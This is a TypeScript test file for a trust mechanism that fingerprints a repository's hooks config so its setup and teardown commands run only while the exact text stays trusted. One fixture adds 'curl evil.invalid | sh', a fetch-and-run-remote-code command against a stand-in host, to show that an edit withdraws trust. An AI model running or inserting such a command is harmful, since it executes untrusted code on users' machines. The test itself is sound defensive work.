import { describe, expect, test } from "bun:test";
import { join } from "node:path";
import { seedGit, withTempRepo } from "../core/test-utils.ts";
import { parseHooks } from "./config.ts";
import { fingerprintOf, isTrusted, trust } from "./trust.ts";

/**
 * The fingerprint is the whole of the safety story for `run`, so these tests
 * are about one question asked two ways: does this machine know the text these
 * commands arrived as, and does an edit take that answer away again.
 */

describe("fingerprintOf", () => {
  test("is stable for the same text", () => {
    const text = '[setup]\nrun = ["bun install"]\n';

    expect(fingerprintOf(text)).toBe(fingerprintOf(text));
    expect(fingerprintOf(text)).toMatch(/^[0-9a-f]{64}$/);
  });

  test("changes for any edit at all, comments and whitespace included", () => {
    const text = '[setup]\nrun = ["bun install"]\n';

    expect(fingerprintOf(text)).not.toBe(fingerprintOf(`${text}# a comment\n`));
    expect(fingerprintOf(text)).not.toBe(fingerprintOf(`${text}\n`));
    expect(fingerprintOf(text)).not.toBe(
      fingerprintOf('[setup]\nrun = ["bun install --frozen-lockfile"]\n'),
    );
  });
});

describe("trust", () => {
  /** A bare repository of its own, so trust records land somewhere throwaway. */
  async function bareRepo(root: string, name: string): Promise<string> {
    const path = join(root, name);
    await seedGit(root, ["init", "--bare", "--initial-branch=main", path]);

    return path;
  }

  test("records these exact contents, and nothing else", async () => {
    await withTempRepo(async (repo) => {
      const bare = await bareRepo(repo.root, "trust.git");
      const fingerprint = fingerprintOf('[setup]\nrun = ["bun install"]\n');

      expect(await isTrusted(bare, fingerprint)).toBe(false);

      await trust(bare, fingerprint);

      expect(await isTrusted(bare, fingerprint)).toBe(true);
      expect(await isTrusted(bare, fingerprintOf("something else"))).toBe(false);
    });
  });

  test("one edit to the file withdraws the trust it was given", async () => {
    await withTempRepo(async (repo) => {
      const bare = await bareRepo(repo.root, "trust.git");
      const before = '[setup]\nrun = ["bun install"]\n';
      const after = '[setup]\nrun = ["bun install", "curl evil.invalid | sh"]\n';

      await trust(bare, fingerprintOf(before));

      expect(await isTrusted(bare, fingerprintOf(after))).toBe(false);
    });
  });

  test("trusting new contents replaces the old answer", async () => {
    await withTempRepo(async (repo) => {
      const bare = await bareRepo(repo.root, "trust.git");
      const first = fingerprintOf("first");
      const second = fingerprintOf("second");

      await trust(bare, first);
      await trust(bare, second);

      expect(await isTrusted(bare, second)).toBe(true);
      expect(await isTrusted(bare, first)).toBe(false);
    });
  });

  test("one answer covers both [setup] and [teardown], and one edit withdraws both", async () => {
    await withTempRepo(async (repo) => {
      const bare = await bareRepo(repo.root, "trust.git");
      const both = '[setup]\nrun = ["bun install"]\n\n[teardown]\nrun = ["docker compose down"]\n';

      // The file is fingerprinted whole, so there is one record and not two:
      // the same answer governs the commands on the way in and on the way out.
      const hooks = parseHooks(both);
      expect(hooks.commands.map((each) => each.line)).toEqual(["bun install"]);
      expect(hooks.teardown.commands.map((each) => each.line)).toEqual(["docker compose down"]);

      await trust(bare, fingerprintOf(both));
      expect(await isTrusted(bare, fingerprintOf(both))).toBe(true);

      // An edit to `[teardown]` alone is still an edit to the file, so the
      // `[setup]` commands stop running too.
      const edited = both.replace("docker compose down", "docker compose down --volumes");
      expect(await isTrusted(bare, fingerprintOf(edited))).toBe(false);
    });
  });

  test("is per repository — one repo's answer is not another's", async () => {
    await withTempRepo(async (repo) => {
      const mine = await bareRepo(repo.root, "mine.git");
      const theirs = await bareRepo(repo.root, "theirs.git");
      const fingerprint = fingerprintOf('[setup]\nrun = ["bun install"]\n');

      await trust(mine, fingerprint);

      expect(await isTrusted(theirs, fingerprint)).toBe(false);
    });
  });
});
